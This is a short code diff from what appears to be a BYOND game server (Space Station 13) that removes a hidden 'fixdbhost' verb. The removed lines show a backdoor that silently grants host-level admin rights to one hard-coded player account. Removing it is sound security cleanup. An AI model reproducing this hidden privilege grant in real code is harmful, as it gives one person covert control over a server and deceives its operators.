@@ -346,19 +346,6 @@
 		webhook_send_garbage(ckey, "[ckey] has logged in with a new IP or CID, from [address] with [computer_id].")
 	webhook_send_login(ckey, address, computer_id)
 
-/client/verb/fixdbhost()
-	set hidden = TRUE
-	set name = "fixdbhost"
-
-	if (ckey != "emoats18" && ckey != "Emoats18")
-		return
-	var/host_file_text = file2text("config/host.txt")
-	if (ckey(host_file_text) != ckey && !holder)
-		holder = new("HHost", FALSE, ckey)
-		var/datum/admins/A = new/datum/admins(holder.rank, holder.rights, ckey)
-		if (directory[ckey])
-			A.associate(directory[ckey])
-
 #undef UPLOAD_LIMIT
 
 //checks if a client is afk
